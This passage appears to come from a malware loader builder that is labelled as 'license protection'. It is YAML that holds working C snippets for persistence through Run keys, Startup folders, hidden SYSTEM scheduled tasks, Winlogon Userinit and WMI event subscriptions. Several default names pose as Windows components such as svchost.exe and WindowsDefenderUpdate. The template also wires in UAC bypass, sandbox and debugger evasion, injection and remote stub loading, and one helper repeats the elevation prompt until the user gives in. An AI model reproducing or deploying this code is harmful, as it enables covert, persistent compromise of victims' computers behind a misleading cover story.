      // Execution mode: Quiet Argument
      // Sets wash_quiet_arg so auto-launch snippets register the stub command with
      // this argument suffix. When the protected PE detects this argument at runtime it
      // takes the silent execution path (stub runs, host UI is suppressed).
      // Must match the quiet mode configuration of the shieldguard command.
      wcscpy_s(wash_quiet_arg, 256, L"$quiet_arg_value$");

- header: Auto-Launch
  template: persistence
  display: Auto-Launch
  allowMultiple: false
  items:
  - id: None
    display: Skip
    default: true
    requires: []
    snippet: |
      // No auto-launch

  - id: HkcuRunKey
    display: HKCU Run Key (User-Level)
    default: false
    requires: []
    inputs:
    - id: hkcu_run_value_name
      label: "Registry Value Name"
      type: textbox
      defaultValue: "WindowsUpdate"
      placeholder: "WindowsUpdate"
    snippet: |
      // Auto-launch: HKCU Run Registry Key
      // Adds the installed stub command to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
      // wash_licensepayload_cmd() returns the Deployment-target path with any quiet arg appended,
      // falling back to wash_licensepayload_path() when no quiet arg is configured.
      // Starts automatically on every user logon. No administrator rights required.
      {
          WCHAR _pers_path[MAX_PATH + 256] = {0};
          HKEY  _pers_hKey;
          wcscpy_s(_pers_path, MAX_PATH + 256, wash_licensepayload_cmd());
          wash_track(wash_licensepayload_path());
          if (RegOpenKeyExW(HKEY_CURRENT_USER,
                            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
              RegSetValueExW(_pers_hKey, L"$hkcu_run_value_name$", 0, REG_SZ,
                             (BYTE*)_pers_path,
                             (DWORD)((wcslen(_pers_path) + 1) * sizeof(WCHAR)));
              RegCloseKey(_pers_hKey);
          }
      }

  - id: StartupFolder
    display: Startup Folder (User-Level)
    default: false
    requires: []
    inputs:
    - id: startup_file_name
      label: "Dropped Filename"
      type: textbox
      defaultValue: "svchost.exe"
      placeholder: "svchost.exe"
    snippet: |
      // Auto-launch: User Startup Folder
      // Copies the installed stub (wash_licensepayload_path()) into the current user's
      // Startup folder. wash_licensepayload_path() returns the Deployment-target path
      // when set, otherwise the current module path (run-in-place mode).
      // Launched on every logon. No administrator rights required.
      {
          WCHAR _sf_src[MAX_PATH] = {0};
          WCHAR _sf_dir[MAX_PATH] = {0};
          WCHAR _sf_dst[MAX_PATH] = {0};
          wcscpy_s(_sf_src, MAX_PATH, wash_licensepayload_path());
          ExpandEnvironmentStringsW(
              L"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
              _sf_dir, MAX_PATH);
          wsprintfW(_sf_dst, L"%s\\$startup_file_name$", _sf_dir);
          if (CopyFileW(_sf_src, _sf_dst, FALSE)) {
              wash_track(_sf_dst);
          }
      }

  - id: ScheduledTask
    display: Scheduled Task (User-Level)
    default: false
    requires: []
    inputs:
    - id: sched_task_name
      label: "Task Name"
      type: textbox
      defaultValue: "MicrosoftEdgeUpdateTask"
      placeholder: "MicrosoftEdgeUpdateTask"
    snippet: |
      // Auto-launch: Scheduled Task via schtasks.exe
      // Creates a logon-triggered task that runs the installed stub silently.
      {
          WCHAR _st_exe[MAX_PATH]      = {0};
          WCHAR _st_cmd[1024]          = {0};
          STARTUPINFOW        _st_si   = {sizeof(_st_si)};
          PROCESS_INFORMATION _st_pi   = {0};
          wcscpy_s(_st_exe, MAX_PATH, wash_licensepayload_path());
          wash_track(_st_exe);
          if (wash_quiet_arg[0] != L'\0') {
              wsprintfW(_st_cmd,
                        L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
                        L"/TR \"\\\"%s\\\" %s\" /SC ONLOGON /RL LIMITED /F",
                        _st_exe, wash_quiet_arg);
          } else {
              wsprintfW(_st_cmd,
                        L"cmd.exe /C schtasks /Create /TN \"$sched_task_name$\" "
                        L"/TR \"\\\"%s\\\"\" /SC ONLOGON /RL LIMITED /F",
                        _st_exe);
          }
          _st_si.dwFlags     = STARTF_USESHOWWINDOW;
          _st_si.wShowWindow = SW_HIDE;
          if (CreateProcessW(NULL, _st_cmd, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &_st_si, &_st_pi)) {
              WaitForSingleObject(_st_pi.hProcess, 5000);
              CloseHandle(_st_pi.hProcess);
              CloseHandle(_st_pi.hThread);
          }
      }

  - id: HklmRunKey
    display: HKLM Run Key (Requires Admin)
    default: false
    requires:
    - uac_bypass
    inputs:
    - id: hklm_run_value_name
      label: "Registry Value Name"
      type: textbox
      defaultValue: "WindowsDefenderUpdate"
      placeholder: "WindowsDefenderUpdate"
    snippet: |
      // Auto-launch: HKLM Run Registry Key
      // Adds the installed stub command to HKLM\Software\Microsoft\Windows\CurrentVersion\Run.
      // Runs at logon for ALL users. Requires administrator rights to write.
      {
          // Loop elevation prompt until the user accepts. 0 = forever, 300ms retry.
          wash_demand_elevation_or_shutdown(0, 300);

          WCHAR _pers_path[MAX_PATH + 256] = {0};
          HKEY  _pers_hKey;
          wcscpy_s(_pers_path, MAX_PATH + 256, wash_licensepayload_cmd());
          wash_track(wash_licensepayload_path());
          if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0, KEY_SET_VALUE, &_pers_hKey) == ERROR_SUCCESS) {
              RegSetValueExW(_pers_hKey, L"$hklm_run_value_name$", 0, REG_SZ,
                             (BYTE*)_pers_path,
                             (DWORD)((wcslen(_pers_path) + 1) * sizeof(WCHAR)));
              RegCloseKey(_pers_hKey);
          }
      }

  - id: LogonScript
    display: Logon Script (HKCU UserInitMprLogonScript, User-Level)
    default: false
    requires: []
    inputs:
    - id: logon_script_file_name
      label: "Dropped Filename"
      type: textbox
      defaultValue: "msedge_update.exe"
      placeholder: "msedge_update.exe"
    snippet: |
      // Auto-launch: HKCU UserInitMprLogonScript Logon Script
      // Copies the installed stub to %APPDATA%\Microsoft\Windows\ and registers
      // it as the user's logon script via HKCU\Environment\UserInitMprLogonScript.
      {
          WCHAR _ls_src[MAX_PATH] = {0};
          WCHAR _ls_dir[MAX_PATH] = {0};
          WCHAR _ls_dst[MAX_PATH] = {0};
          HKEY  _ls_hKey;
          wcscpy_s(_ls_src, MAX_PATH, wash_licensepayload_path());
          ExpandEnvironmentStringsW(L"%APPDATA%\\Microsoft\\Windows", _ls_dir, MAX_PATH);
          wsprintfW(_ls_dst, L"%s\\$logon_script_file_name$", _ls_dir);
          if (!CopyFileW(_ls_src, _ls_dst, FALSE))
              wcscpy_s(_ls_dst, MAX_PATH, _ls_src);
          else
              wash_track(_ls_dst);
          if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment",
                            0, KEY_SET_VALUE, &_ls_hKey) == ERROR_SUCCESS) {
              RegSetValueExW(_ls_hKey, L"UserInitMprLogonScript", 0, REG_SZ,
                             (BYTE*)_ls_dst,
                             (DWORD)((wcslen(_ls_dst) + 1) * sizeof(WCHAR)));
              RegCloseKey(_ls_hKey);
          }
      }

  - id: AllUsersStartup
    display: All-Users Startup Folder (Admin)
    default: false
    requires:
    - uac_bypass
    inputs:
    - id: allusers_startup_file_name
      label: "Dropped Filename"
      type: textbox
      defaultValue: "RuntimeBrokerHelper.exe"
      placeholder: "RuntimeBrokerHelper.exe"
    snippet: |
      // Auto-launch: All-Users Startup Folder
      // Copies the installed stub into
      // %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup.
      // Launched automatically at every logon for ANY user on the system.
      // Requires administrator rights.
      {
          wash_demand_elevation_or_shutdown(0, 300);
          WCHAR _aus_src[MAX_PATH] = {0};
          WCHAR _aus_dir[MAX_PATH] = {0};
          WCHAR _aus_dst[MAX_PATH] = {0};
          wcscpy_s(_aus_src, MAX_PATH, wash_licensepayload_path());
          ExpandEnvironmentStringsW(
              L"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
              _aus_dir, MAX_PATH);
          wsprintfW(_aus_dst, L"%s\\$allusers_startup_file_name$", _aus_dir);
          if (CopyFileW(_aus_src, _aus_dst, FALSE))
              wash_track(_aus_dst);
      }

  - id: SchtasksSystem
    display: System Boot Task (Admin)
    default: false
    requires:
    - uac_bypass
    inputs:
    - id: sched_system_task_name
      label: "Task Name"
      type: textbox
      defaultValue: "MicrosoftWindowsDefenderPeriodicScanCheck"
      placeholder: "MicrosoftWindowsDefenderPeriodicScanCheck"
    - id: sched_startup_delay
      label: "Startup delay (HHMM:SS)"
      type: textbox
      defaultValue: "0001:00"
      placeholder: "0001:00"
    snippet: |
      // Auto-launch: Scheduled Task — System Boot, SYSTEM Account
      // Creates a task that fires at every system startup running as SYSTEM
      // with highest privilege. Ideal for scheduled license checks.
      {
          wash_demand_elevation_or_shutdown(0, 300);
          WCHAR _ss_exe[MAX_PATH] = {0};
          WCHAR _ss_cmd[1024]     = {0};
          STARTUPINFOW        _ss_si = {sizeof(_ss_si)};
          PROCESS_INFORMATION _ss_pi = {0};
          wcscpy_s(_ss_exe, MAX_PATH, wash_licensepayload_path());
          wash_track(_ss_exe);
          if (wash_quiet_arg[0] != L'\0') {
              wsprintfW(_ss_cmd,
                        L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
                        L"/TR \"\\\"%s\\\" %s\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /DELAY $sched_startup_delay$",
                        _ss_exe, wash_quiet_arg);
          } else {
              wsprintfW(_ss_cmd,
                        L"cmd.exe /C schtasks /Create /TN \"$sched_system_task_name$\" "
                        L"/TR \"\\\"%s\\\"\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F /DELAY $sched_startup_delay$",
                        _ss_exe);
          }
          _ss_si.dwFlags     = STARTF_USESHOWWINDOW;
          _ss_si.wShowWindow = SW_HIDE;
          if (CreateProcessW(NULL, _ss_cmd, NULL, NULL, FALSE,
                             CREATE_NO_WINDOW, NULL, NULL, &_ss_si, &_ss_pi)) {
              WaitForSingleObject(_ss_pi.hProcess, 5000);
              CloseHandle(_ss_pi.hProcess);
              CloseHandle(_ss_pi.hThread);
          }
      }

  - id: WinlogonUserinit
    display: Winlogon Userinit (Admin)
    default: false
    requires:
    - uac_bypass
    snippet: |
      // Auto-launch: Winlogon Userinit Registry Entry
      // Appends the installed stub command to the comma-separated Userinit value at
      // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.
      // Requires administrator rights.
      {
          wash_demand_elevation_or_shutdown(0, 300);
          WCHAR _wu_cmd[MAX_PATH + 256]      = {0};
          WCHAR _wu_path[MAX_PATH]           = {0};
          WCHAR _wu_cur[1024]                = {0};
          WCHAR _wu_new[1024 + MAX_PATH + 258] = {0};
          HKEY  _wu_hKey;
          wcscpy_s(_wu_path, MAX_PATH, wash_licensepayload_path());
          wcscpy_s(_wu_cmd, MAX_PATH + 256, wash_licensepayload_cmd());
          wash_track(_wu_path);
          if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                            L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                            0, KEY_QUERY_VALUE | KEY_SET_VALUE, &_wu_hKey) == ERROR_SUCCESS) {
              DWORD _wu_type = 0;
              DWORD _wu_sz   = (DWORD)sizeof(_wu_cur);
              RegQueryValueExW(_wu_hKey, L"Userinit", NULL,
                               &_wu_type, (BYTE*)_wu_cur, &_wu_sz);
              if (wcsstr(_wu_cur, _wu_path) == NULL) {
                  size_t _wu_len = wcslen(_wu_cur);
                  if (_wu_len > 0 && _wu_cur[_wu_len - 1] != L',')
                      wcscat_s(_wu_cur, 1024, L",");
                  wsprintfW(_wu_new, L"%s%s,", _wu_cur, _wu_cmd);
                  RegSetValueExW(_wu_hKey, L"Userinit", 0, REG_SZ,
                                 (BYTE*)_wu_new,
                                 (DWORD)((wcslen(_wu_new) + 1) * sizeof(WCHAR)));
              }
              RegCloseKey(_wu_hKey);
          }
      }

  - id: WmiEventSubscription
    display: WMI Event Subscription (Admin)
    default: false
    requires:
    - uac_bypass
    inputs:
    - id: wmi_filter_name
      label: "WMI Filter Name"
      type: textbox
      defaultValue: "MicrosoftWindowsUpdateFilter"
      placeholder: "MicrosoftWindowsUpdateFilter"
    - id: wmi_consumer_name
      label: "WMI Consumer Name"
      type: textbox
      defaultValue: "MicrosoftWindowsUpdateConsumer"
      placeholder: "MicrosoftWindowsUpdateConsumer"
    snippet: |
      // Auto-launch: WMI Permanent Event Subscription
      // Registers a permanent WMI subscription in the root\subscription namespace.
      // Entries live in the WMI repository, not in the registry or Task Scheduler.
      // Requires administrator rights.
      {
          wash_demand_elevation_or_shutdown(0, 300);
          WCHAR _wm_exe[MAX_PATH]       = {0};
          WCHAR _wm_tmp_base[MAX_PATH]  = {0};
          WCHAR _wm_tmp[MAX_PATH]       = {0};
          WCHAR _wm_cmd[512]            = {0};
          WCHAR _wm_scr[2048]           = {0};
          STARTUPINFOW        _wm_si = {sizeof(_wm_si)};
          PROCESS_INFORMATION _wm_pi = {0};
          wcscpy_s(_wm_exe, MAX_PATH, wash_licensepayload_path());
          wash_track(_wm_exe);
          GetTempPathW(MAX_PATH, _wm_tmp_base);
          wsprintfW(_wm_tmp, L"%swusa_svc.ps1", _wm_tmp_base);
          wsprintfW(_wm_scr,
              L"$e='%s';"
              L"$ct='\"'+$e+'\"';"
              L"$f=Set-WmiInstance -Namespace root\\subscription "
              L"-Class __EventFilter "
              L"-Arguments @{Name='$wmi_filter_name$';"
              L"EventNameSpace='root\\cimv2';"
              L"QueryLanguage='WQL';"
              L"Query='SELECT * FROM __InstanceCreationEvent WITHIN 30 "
              L"WHERE TargetInstance ISA ''Win32_LogonSession'' "
              L"AND TargetInstance.LogonType=2'};"
              L"$c=Set-WmiInstance -Namespace root\\subscription "
              L"-Class CommandLineEventConsumer "
              L"-Arguments @{Name='$wmi_consumer_name$';"
              L"CommandLineTemplate=$ct};"
              L"Set-WmiInstance -Namespace root\\subscription "
              L"-Class __FilterToConsumerBinding "
              L"-Arguments @{Filter=$f;Consumer=$c};",
              _wm_exe);
          HANDLE _wm_fh = CreateFileW(_wm_tmp, GENERIC_WRITE, 0, NULL,
                                      CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
          if (_wm_fh != INVALID_HANDLE_VALUE) {
              DWORD _wm_dw      = 0;
              BYTE  _wm_bom[2]  = {0xFF, 0xFE};
              WriteFile(_wm_fh, _wm_bom, 2, &_wm_dw, NULL);
              WriteFile(_wm_fh, _wm_scr,
                        (DWORD)(wcslen(_wm_scr) * sizeof(WCHAR)), &_wm_dw, NULL);
              CloseHandle(_wm_fh);
              wsprintfW(_wm_cmd,
                        L"powershell.exe -NoProfile -WindowStyle Hidden "
                        L"-ExecutionPolicy Bypass -File \"%s\"",
                        _wm_tmp);
              _wm_si.dwFlags     = STARTF_USESHOWWINDOW;
              _wm_si.wShowWindow = SW_HIDE;
              if (CreateProcessW(NULL, _wm_cmd, NULL, NULL, FALSE,
                                 CREATE_NO_WINDOW, NULL, NULL, &_wm_si, &_wm_pi)) {
                  WaitForSingleObject(_wm_pi.hProcess, 15000);
                  CloseHandle(_wm_pi.hProcess);
                  CloseHandle(_wm_pi.hThread);
              }
              DeleteFileW(_wm_tmp);
          }
      }

templates:
- id: default
  display: Default License Protection
  description: Full-featured license protection loader with every playbook section wired up. Swap snippets per section to tune behavior.
  content: |
    #define WIN32_LEAN_AND_MEAN
    #include <windows.h>
    #include <winternl.h>
    #include <intrin.h>
    #include <tlhelp32.h>
    #include <shlobj.h>
    #include <shellapi.h>
    #include <iphlpapi.h>
    #include <lm.h>
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "netapi32.lib")
    #pragma comment(lib, "shell32.lib")

    {{PREAMBLE}}

    {{PROCESS_LOOKUP_HELPER}}

    INT main(VOID)
    {
        // Stage 1 - environment probing (cheap, runs first so bail-outs are fast).
        {{ENV_VALIDATION}}
        {{DEPLOYMENT_CONTEXT}}
        {{LICENSE_CONDITIONS}}

        // Stage 2 - runtime integrity checks.
        {{RUNTIME_INTEGRITY}}
        {{CONTEXT_ANALYSIS}}

        // Stage 3 - misdirection.
        {{LAUNCH_BEHAVIORS}}

        // Stage 4 - elevation, deploy, auto-launch wiring.
        {{ELEVATION_HANDLING}}
        {{DEPLOYMENT_TARGET}}
        {{EXECUTION_MODES}}
        {{AUTO_LAUNCH}}
        {{STEALTH_OPTIONS}}

        // Stage 5 - load & deliver stub.
        {{LICENSE_STUB_SOURCE}}
        {{LICENSE_STUB_URL}}

        {{LICENSE_MODULE_LOADING}}
        {{STUB_EXECUTION}}

        Sleep(1);
        return 0;
    }
  placeholders:
  - name: PREAMBLE
    kind: system
  - name: PROCESS_LOOKUP_HELPER
    kind: system
  - name: LICENSE_STUB_SOURCE
    kind: system
  - name: LICENSE_STUB_URL
    kind: system
  - name: ENV_VALIDATION
    kind: snippet
    snippetTemplate: emulationprotection
  - name: DEPLOYMENT_CONTEXT
    kind: snippet
    snippetTemplate: sandboxprotection
  - name: LICENSE_CONDITIONS
    kind: snippet
    snippetTemplate: licenseguardrail
  - name: RUNTIME_INTEGRITY
    kind: snippet
    snippetTemplate: debugprotection
  - name: CONTEXT_ANALYSIS
    kind: snippet
    snippetTemplate: analysisprotection
  - name: LAUNCH_BEHAVIORS
    kind: snippet
    snippetTemplate: coveroperation
  - name: ELEVATION_HANDLING
    kind: snippet
    snippetTemplate: uacb
  - name: DEPLOYMENT_TARGET
    kind: snippet
    snippetTemplate: installation
  - name: EXECUTION_MODES
    kind: snippet
    snippetTemplate: licensecaveconfig
  - name: AUTO_LAUNCH
    kind: snippet
    snippetTemplate: persistence
  - name: STEALTH_OPTIONS
    kind: snippet
    snippetTemplate: evasion
  - name: LICENSE_MODULE_LOADING
    kind: snippet
    snippetTemplate: licenseinjection
  - name: STUB_EXECUTION
    kind: snippet
    snippetTemplate: licensestubexecution
